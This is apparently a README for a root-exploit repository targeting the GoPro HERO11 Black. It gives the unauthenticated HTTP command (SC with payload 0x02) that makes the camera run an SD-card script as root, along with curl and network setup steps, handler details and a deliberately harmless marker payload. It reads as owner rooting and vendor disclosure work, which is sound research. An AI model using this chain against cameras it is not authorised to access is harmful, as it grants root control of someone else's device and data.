# GoPro HERO11 Black — `SC` root

Root code execution on a GoPro HERO11 Black running **H22.01.02.20.00**, using
only the camera's own HTTP server. No firmware flashing, no memory corruption,
no USB exploit.

> **Use this only on a camera you own.** The trigger is only reachable on the
> camera's own Wi-Fi AP or its USB network gadget, so it needs physical control
> of the camera — but that does not make it okay to run against someone else's
> device. See [Legal](#legal).

## What it does

```
GET /gp/gpCamera?cmd=SC&p=%02
   -> gpHttpServer (port 80, unauthenticated)
   -> gpNet mailbox  (/to_gpnet, TLV type 2)
   -> BP command "SC" -> handler RTsetSC @ 0x41d888
   -> system("/tmp/fuse_d/scheduled_capture.sh&")  as root
```

`/tmp/fuse_d` is the mounted SD card. `scheduled_capture.sh` is a script you put
at the card root; the firmware contains the path as a hardcoded string and runs
it when it receives the `SC` command with payload byte `0x02`.

The marker from a successful run:

```
uid:   uid=0(root) gid=0(root)
uname: Linux gopro 4.19.124 #1 SMP PREEMPT ... aarch64 GNU/Linux
ppid:  /sbin/finit
```

## Requirements

- GoPro HERO11 Black on firmware **H22.01.02.20.00** (tested). Other versions and
  models are unverified — the command table may differ, and a wrong command can
  make the camera's `gpNet` daemon unhappy until it restarts.
- An SD card with `scheduled_capture.sh` at its root.
- A network path to the camera's HTTP server (port 80):
  - **Wi-Fi AP** — verified. Enable wireless on the camera, join its AP; the
    camera is `10.5.5.9`. You need the camera's Wi-Fi password (shown on the
    camera when you enable wireless).
  - **USB NCM** — the same server at `172.23.148.51`; expected to behave
    identically (not separately verified in this repo).
- `curl` on the host.

## Quick start — Wi-Fi (verified)

1. Copy the payload to the card root:

   ```bash
   cp payloads/scheduled_capture.sh /media/$USER/<CARD>/scheduled_capture.sh
   ```

2. Put the card in the camera and enable wireless on it
   (Preferences → Connections → Wireless Connections). Note the AP name and
   password.

3. Join the camera AP from the host and confirm the server:

   ```bash
   curl -s http://10.5.5.9/gp/gpControl/info
   ```

4. Fire the command:

   ```bash
   ./root-sc.sh
   # GET http://10.5.5.9/gp/gpCamera?cmd=SC&p=%02
   # curl exit=0 http=200 bytes=1 body=00
   ```

5. Verify: `/ROOTED.txt` at the card root, and
   `DCIM/100GOPRO/ROOTED.TXT` in the media list.

## Quick start — USB NCM

1. Same card payload.
2. Plug the camera in over USB; it enumerates as a CDC-NCM ethernet gadget
   (plus MTP). Give the host an address on its subnet:

   ```bash
   ip -br link | grep enx                 # find the new interface
   sudo ip addr add 172.23.148.52/24 dev enx...
   curl -s http://172.23.148.51/gp/gpControl/info
   ./root-sc.sh http://172.23.148.51
   ```

   Note: USB and Wi-Fi are mutually exclusive on this camera; BLE turns off
   while USB is connected.

## Verify without pulling the card

`/gopro/media/list` on port 8080 (or `/gp/gpMediaList` on port 80) shows the
`DCIM` copy:

```bash
curl -s http://10.5.5.9:8080/gopro/media/list | grep -o ROOTED.TXT
```

## What the payload does

The bundled payload is deliberately boring: it writes `uid`, `uname`, `date`
and `pwd` to `/ROOTED.txt`, copies that to `DCIM/100GOPRO/ROOTED.TXT`, and
stops. It does not persist, does not change settings, and does not reboot.

Edit it if you want more. It runs as root with `/bin/sh` from `/`, so use
absolute paths. A reboot line is included but commented out.

## Troubleshooting

| Symptom | Meaning |
|---|---|
| `http=200 bytes=1 body=00` | gpNet accepted `SC`. If no marker appeared, the file was missing/unreadable at `/tmp/fuse_d/scheduled_capture.sh`. |
| `500 Server error: RX timeout.` (after 10 s) | gpNet did not reply. Wrong command or payload length; `gpNet` usually recovers. `S4` is a *different* command that needs an 11–40 byte payload — sending it 1 byte is a good way to provoke this. |
| `404` / `Error 404` | Wrong path; it is `/gp/gpCamera` on port 80, not 8080. |
| Camera AP not visible | Wireless is off, or USB is connected (USB disables Wi-Fi/BLE). Enable wireless on the camera. |
| Camera unreachable after success | The payload may have rebooted it; the AP is off after a reboot until wireless is enabled again. |

## How it works

The full chain, the 66-entry command table decode (`SC` is entry 63), the
handler's three payload branches and the reverse-engineering notes are in
[`docs/how-it-works.md`](docs/how-it-works.md).

Short version: `SC` is a test hook for the camera's scheduled-capture feature.
Payload `0x01` ("Allow Scheduled Capture") sets the feature bit that gates the
normal wake path, and `0x02` ("Start Scheduled Capture") runs the card script
**without** checking that bit. The command is reachable through the
unauthenticated legacy HTTP proxy.

## Tested on

- HERO11 Black, firmware `H22.01.02.20.00` (retail): Wi-Fi path, verified.
  Marker written with `uid=0(root)`, `ppid=/sbin/finit`.

## Cleanup

- Delete `scheduled_capture.sh` and `ROOTED.txt` from the card, and
  `DCIM/100GOPRO/ROOTED.TXT`.
- Nothing was installed on the camera by the default payload; a reboot is enough.

## Legal

This is a logic flaw in firmware you own, published for owners of the same
device and for defensive research. Run it only against hardware you own or are
explicitly authorized to test. Do not use it to access a device or data that is
not yours. Depending on where you live, circumventing device protections can
have legal consequences even on hardware you own; check your local law. The
code is provided as-is, with no warranty and no liability.

If you are GoPro: this is a design issue, not a memory-safety bug — a debug/test
hook that executes a file from removable storage, reachable through the
unauthenticated legacy HTTP API. It is worth a look.
